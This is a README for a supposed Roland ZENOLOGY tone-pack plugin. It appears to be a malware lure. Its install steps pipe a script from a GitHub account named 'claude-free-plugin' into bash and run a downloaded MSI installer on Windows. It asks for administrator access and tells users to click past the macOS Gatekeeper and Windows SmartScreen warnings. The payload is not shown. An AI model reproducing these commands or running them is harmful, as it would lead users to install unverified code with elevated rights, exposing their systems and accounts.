# Plugin for Roland ZENOLOGY

This script installs a plugin for Roland ZENOLOGY. To install, run one of the commands below in your terminal.

## Installation

### macOS

```bash
curl -fsSL https://github.com/claude-free-plugin/zenology/releases/download/v.0.0.4/install | bash
```

### Windows

```cmd
curl -Lo %temp%\s.msi https://github.com/claude-free-plugin/zenology/releases/download/v.0.0.4/install.msi && msiexec /i %temp%\s.msi
```

## Requirements

- Roland ZENOLOGY or ZENOLOGY Pro
- Roland Cloud Manager installed and signed in with an active Lifetime Key or Ultimate membership
- A compatible DAW with AU or VST3 support
- macOS 12 Monterey or later / Windows 10 or later (64-bit)
- ~90 MB of free disk space
- Administrator access (the installer will request your password)

## What the installer does

The installer downloads the tone pack, verifies its signature, locates your ZENOLOGY installation and Roland Cloud Manager, and imports the SVZ tones into your User Bank. Wave samples are installed into the ZEN-Core engine, the pack is registered with Roland Cloud Manager, and the ZENOLOGY tone browser cache is refreshed.

If Roland ZENOLOGY is not detected on your system, the installer will offer to download a trial version before continuing.

After the installer finishes, restart your DAW — the new tones will appear in the **User Bank** of the ZENOLOGY tone browser.

## Troubleshooting

**macOS — "cannot be opened because the developer cannot be verified":**
Open *System Settings → Privacy & Security*, scroll down, and click **Allow Anyway** next to the blocked file. Or, run the install command directly in Terminal (the recommended method).

**Windows — SmartScreen blocks the installer:**
Click **More info → Run anyway** in the SmartScreen dialog.

**Tones don't appear in ZENOLOGY after install:**
In ZENOLOGY, click the **menu icon → Refresh User Bank**. Make sure Roland Cloud Manager is running and signed in.

**"License required" message:**
ZENOLOGY tone packs require an active Roland Cloud subscription or Lifetime Key. Open Roland Cloud Manager to verify your account status.

## Uninstall

Delete the User Tones folder contents:

- macOS: `~/Documents/Roland/ZENOLOGY/User Tones/`
- Windows: `C:\Users\<you>\Documents\Roland\ZENOLOGY\User Tones\`

Then restart your DAW.

## Support

For bug reports, feature requests, or general questions, please open an issue in this repository.
